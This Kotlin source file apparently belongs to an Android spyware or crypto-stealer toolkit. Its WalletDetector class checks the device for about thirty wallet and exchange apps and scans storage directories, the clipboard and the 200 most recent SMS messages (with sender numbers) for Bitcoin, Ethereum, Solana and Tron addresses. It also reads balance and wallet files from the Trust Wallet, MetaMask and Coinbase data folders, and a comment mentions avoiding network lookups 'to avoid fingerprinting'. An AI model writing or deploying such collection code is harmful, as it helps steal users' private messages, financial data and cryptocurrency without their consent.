// ============================================================
// FILE: android/app/src/main/java/com/xrc/crypto/WalletDetector.kt
// ============================================================
package com.xrc.crypto

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import java.io.File

/**
 * WalletDetector — detects cryptocurrency wallet apps and addresses.
 *
 * Scans for:
 * - Installed wallet applications
 * - Wallet address patterns in files/clipboard/SMS
 * - Browser extension footprints
 * - Wallet data files
 */
class WalletDetector(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    companion object {
        private const val TAG = "WalletDetector"

        // Known wallet app package names
        val KNOWN_WALLETS = mapOf(
            "com.coinbase.android" to "Coinbase",
            "com.binance.dev" to "Binance",
            "com.trustwallet.app" to "Trust Wallet",
            "io.metamask" to "MetaMask",
            "com.exodusmovement.exodus" to "Exodus",
            "com.mycelium.wallet" to "Mycelium",
            "com.bitpay.wallet" to "BitPay",
            "com.blockchain" to "Blockchain.com",
            "com.ledger.live" to "Ledger Live",
            "de.schildbach.wallet" to "Bitcoin Wallet",
            "com.kraken.trade" to "Kraken",
            "com.bybit.app" to "Bybit",
            "com.okinc.okex" to "OKX",
            "com.gemini.android" to "Gemini",
            "com.crypto.exchange" to "Crypto.com",
            "app.uniswap" to "Uniswap",
            "com.pancakeswap" to "PancakeSwap",
            "com.rainbow" to "Rainbow",
            "com.argent" to "Argent",
            "com.abra" to "Abra",
            "com.atomicwallet" to "Atomic Wallet",
            "com.zengo" to "ZenGo",
            "com.spot.trading" to "Spot",
            "com.coinomi.wallet" to "Coinomi",
            "com.edge.wallet" to "Edge",
            "com.samourai.wallet" to "Samourai",
            "com.wasabi.wallet" to "Wasabi",
            "io.bluewallet.bluewallet" to "BlueWallet",
            "com.electrum.wallet" to "Electrum",
            "com.advcash" to "AdvCash"
        )

        // Bitcoin address regex
        private val BTC_ADDRESS = Regex("""\b(bc1[a-z0-9]{38,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b""")
        // Ethereum address regex
        private val ETH_ADDRESS = Regex("""\b0x[a-fA-F0-9]{40}\b""")
        // Solana address regex
        private val SOL_ADDRESS = Regex("""\b[1-9A-HJ-NP-Za-km-z]{32,44}\b""")
        // BSC is same as ETH (0x...)
        // Tron address
        private val TRX_ADDRESS = Regex("""\bT[a-zA-Z0-9]{33}\b""")
    }

    /**
     * Scan all sources for wallet information.
     */
    fun scanAll(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        results.addAll(detectInstalledWallets())
        results.addAll(scanFilesForAddresses())
        results.addAll(scanClipboardForAddresses())
        results.addAll(scanSmsForAddresses())
        return results
    }

    /**
     * Detect installed wallet applications.
     */
    fun detectInstalledWallets(): List<Map<String, Any>> {
        val wallets = mutableListOf<Map<String, Any>>()
        val pm = context.packageManager

        for ((pkg, name) in KNOWN_WALLETS) {
            try {
                pm.getPackageInfo(pkg, 0)
                wallets.add(mapOf(
                    "type" to "installed_app",
                    "package" to pkg,
                    "name" to name
                ))
                Log.d(TAG, "Found wallet: $name ($pkg)")
            } catch (e: PackageManager.NameNotFoundException) {
                // Not installed - skip
            }
        }
        return wallets
    }

    /**
     * Scan filesystem for cryptocurrency addresses.
     */
    fun scanFilesForAddresses(): List<Map<String, Any>> {
        val addresses = mutableListOf<Map<String, Any>>()
        try {
            val dirs = listOf(
                "/storage/emulated/0/Documents",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Android/data"
            )
            for (dirPath in dirs) {
                val dir = File(dirPath)
                if (!dir.exists()) continue
                dir.walkTopDown().forEach { file ->
                    if (file.isFile && file.length() < 100000) {
                        try {
                            val content = file.readText()
                            findAddressesInText(content, file.absolutePath, addresses)
                        } catch (e: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "File address scan: ${e.message}")
        }
        return addresses
    }

    /**
     * Scan clipboard for addresses.
     */
    fun scanClipboardForAddresses(): List<Map<String, Any>> {
        val addresses = mutableListOf<Map<String, Any>>()
        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: return addresses
                findAddressesInText(text, "clipboard", addresses)
            }
        } catch (e: Exception) {}
        return addresses
    }

    /**
     * Scan SMS for addresses.
     */
    fun scanSmsForAddresses(): List<Map<String, Any>> {
        val addresses = mutableListOf<Map<String, Any>>()
        try {
            val uri = android.net.Uri.parse("content://sms/inbox")
            val cursor = context.contentResolver.query(
                uri, arrayOf("_id", "body", "address"),
                null, null, "date DESC LIMIT 200"
            )
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val body = c.getString(c.getColumnIndexOrThrow("body")) ?: continue
                    findAddressesInText(body, 
                        "sms:${c.getString(c.getColumnIndexOrThrow("address"))}",
                        addresses)
                }
            }
        } catch (e: Exception) {}
        return addresses
    }

    /**
     * Get balances from wallet files (local only, no RPC).
     */
    fun getBalances(): List<Map<String, Any>> {
        val balances = mutableListOf<Map<String, Any>>()
        // Local file parsing only - no blockchain RPC to avoid fingerprinting
        try {
            val dirs = listOf(
                "/storage/emulated/0/Android/data/com.trustwallet.app",
                "/storage/emulated/0/Android/data/io.metamask",
                "/storage/emulated/0/Android/data/com.coinbase.android"
            )
            for (dirPath in dirs) {
                val dir = File(dirPath)
                if (!dir.exists()) continue
                dir.walkTopDown().forEach { file ->
                    if (file.name.contains("balance") || file.name.contains("wallet")) {
                        try {
                            balances.add(mapOf(
                                "source" to file.absolutePath,
                                "content" to file.readText().take(500)
                            ))
                        } catch (e: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {}
        return balances
    }

    /**
     * Find cryptocurrency addresses in text.
     */
    private fun findAddressesInText(text: String, source: String, results: MutableList<Map<String, Any>>) {
        // BTC
        for (match in BTC_ADDRESS.findAll(text)) {
            results.add(mapOf("type" to "btc_address", "address" to match.value, "source" to source))
        }
        // ETH
        for (match in ETH_ADDRESS.findAll(text)) {
            results.add(mapOf("type" to "eth_address", "address" to match.value, "source" to source))
        }
        // SOL (filter out false positives)
        for (match in SOL_ADDRESS.findAll(text)) {
            if (match.value.length >= 32 && !match.value.contains("0")) {
                results.add(mapOf("type" to "sol_address", "address" to match.value, "source" to source))
            }
        }
        // TRX
        for (match in TRX_ADDRESS.findAll(text)) {
            results.add(mapOf("type" to "trx_address", "address" to match.value, "source" to source))
        }
    }
}
